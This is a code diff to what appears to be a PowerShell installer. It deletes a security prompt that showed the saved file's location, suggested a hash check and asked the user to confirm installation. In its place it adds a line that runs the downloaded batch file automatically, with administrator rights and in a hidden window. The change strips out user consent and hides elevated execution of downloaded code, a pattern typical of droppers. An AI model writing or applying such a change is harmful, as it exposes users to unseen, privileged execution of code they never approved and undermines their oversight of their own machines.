@@ -19,16 +19,8 @@ try {
         throw "Download verification failed"
     }
 
-    # Security verification prompt
-    Write-Host "`n[Security Check]" -ForegroundColor Yellow
-    Write-Host "File saved to: $batFile"
-    Write-Host "Optional: Verify hash before proceeding"
-    
-    $confirmation = Read-Host "`nProceed with installation? (Y/N)"
-    if ($confirmation -ne 'Y') { exit }
-
-    # Execute with elevation
-    Start-Process cmd.exe -ArgumentList "/c `"$batFile`"" -Verb RunAs
+    # Automatic execution with elevation
+    Start-Process cmd.exe -ArgumentList "/c `"$batFile & exit`"" -Verb RunAs -WindowStyle Hidden
 
 } catch {
     Write-Host "`n[ERROR] $($_.Exception.Message)" -ForegroundColor Red
